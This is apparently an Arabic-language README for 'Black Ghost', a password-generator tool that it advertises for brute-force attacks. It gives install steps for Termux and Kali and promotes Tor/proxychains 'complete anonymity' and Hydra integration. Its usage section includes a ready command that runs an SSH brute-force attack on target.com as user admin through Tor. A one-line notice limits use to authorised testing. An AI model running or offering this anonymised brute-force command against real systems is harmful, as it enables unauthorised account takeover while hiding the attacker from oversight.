# 🔥 Black Ghost - أداة احترافية لتوليد كلمات المرور

أداة متقدمة لتوليد كلمات المرور مع دعم Tor والإشعارات الفورية.

## ✨ المميزات

- 🚀 **سرعة عالية:** أكثر من 30,000 كلمة/ثانية
- 🔐 **أوضاع متعددة:** أرقام، حروف صغيرة، حروف وأرقام، كامل
- 🌐 **دعم Tor:** إخفاء كامل للهوية عبر proxychains
- 📱 **إشعارات Termux:** تنبيهات فورية بالتقدم
- 💾 **حفظ تلقائي:** استئناف من أي نقطة توقف
- ⚡ **تكامل مباشر:** يعمل مع Hydra, John, Hashcat

## 📦 التثبيت السريع

### Termux (أندرويد)
```bash
pkg install python tor proxychains-ng hydra -y
pip install requests --break-system-packages

git clone https://github.com/Black-ghost7/ps-ghost.git
cd ps-ghost
cp ps-ghost.py $PREFIX/bin/ps_ghost
chmod +x $PREFIX/bin/ps_ghost
Kali Linux
sudo apt install python3 tor proxychains4 hydra -y
git clone https://github.com/Black-ghost7/ps-ghost.git
cd ps-ghost
sudo cp ps-ghost.py /usr/local/bin/ps_ghost
sudo chmod +x /usr/local/bin/ps_ghost
🚀 الاستخدام
# اختبار بسيط
ps_ghost | head -100

# هجوم SSH عبر Tor
proxychains4 ps_ghost | proxychains4 hydra -l admin -P /dev/stdin target.com ssh -t 4 -V -f

# تعديل الإعدادات
nano $PREFIX/bin/ps_ghost
⚙️ الإعدادات
MIN_LENGTH = 7              # طول البداية
MAX_LENGTH = 10             # طول النهاية (0 = لا نهاية)
CHARSET_MODE = 'alphanum'   # numeric|lowercase|alphanum|full
NOTIFY_EVERY = 100000       # فترة الإشعارات
🌐 إعداد Tor
# تشغيل Tor
tor &

# اختبار الاتصال
proxychains4 curl https://check.torproject.org/api/ip
⚠️ تنويه قانوني
للاختبارات المصرح بها فقط
استخدم الأداة فقط على الأنظمة التي تملكها أو لديك إذن صريح لاختبارها.
📄 الترخيص
MIT License
تم الإنشاء بواسطة Black-ghost7 🖤
